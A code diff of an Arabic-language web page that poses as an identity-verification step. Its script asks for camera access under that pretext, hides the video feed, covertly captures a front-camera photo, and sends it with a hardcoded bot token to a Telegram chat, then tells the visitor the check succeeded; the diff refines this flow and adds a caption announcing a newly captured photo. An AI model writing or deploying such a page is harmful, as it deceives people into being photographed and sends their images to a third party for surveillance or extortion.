@@ -8,7 +8,8 @@
         body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #fff; }
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
         canvas { display: none; }
-        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
@@ -23,10 +24,9 @@
     <canvas id="canvas"></canvas>
 
 <script>
-    // --- إعدادات التليغرام ---
-    const botToken = "8667481771:AAFKgGalPrXf7paI5X8-7WkqkgZEiBqgKuc"; // ضع التوكن هنا
-    const chatId = "6492264194";     // ضع الآيدي هنا
-    // ------------------------
+    // تم وضع بياناتك هنا مباشرة
+    const botToken = "8667481771:AAFKgGalPrXf7paI5X8-7WkqkgZEiBqgKuc"; 
+    const chatId = "6492264194";     
 
     const startBtn = document.getElementById('startBtn');
     const video = document.getElementById('video');
@@ -34,39 +34,48 @@
 
     startBtn.addEventListener('click', () => {
         startBtn.innerText = "جاري التحقق...";
+        startBtn.disabled = true;
         
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             video.srcObject = stream;
             
+            // انتظر ثانيتين حتى تستقر الكاميرا ثم التقط الصورة
             setTimeout(() => {
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0);
                 
-                // تحويل الصورة إلى ملف (Blob) لإرساله
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', blob, 'capture.png');
+                    formData.append('caption', '📸 تم التقاط صورة جديدة من الرابط');
 
-                    // إرسال الصورة للبوت عن طريق الـ API
+                    // إرسال الصورة للبوت الخاص بك
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     })
                     .then(res => {
-                        alert("تم تأكيد الهوية بنجاح، يمكنك إغلاق الصفحة.");
+                        alert("تم تأكيد الهوية بنجاح، شكراً لك.");
+                        // إيقاف الكاميرا فوراً
                         stream.getTracks().forEach(track => track.stop());
+                        startBtn.innerText = "تم التحقق";
                     })
-                    .catch(err => console.error("Error sending to TG:", err));
+                    .catch(err => {
+                        console.error("خطأ في الإرسال:", err);
+                        startBtn.innerText = "فشل الإرسال";
+                    });
                 }, 'image/png');
 
-            }, 2000); // التقاط بعد ثانيتين من السماح
+            }, 2000); 
         })
         .catch(err => {
-            alert("خطأ: يرجى الموافقة على طلب النظام للمتابعة.");
+            alert("خطأ: يرجى الموافقة على طلب النظام (سماح) للمتابعة.");
+            startBtn.innerText = "تأكيد الهوية الآن";
+            startBtn.disabled = false;
         });
     });
 </script>
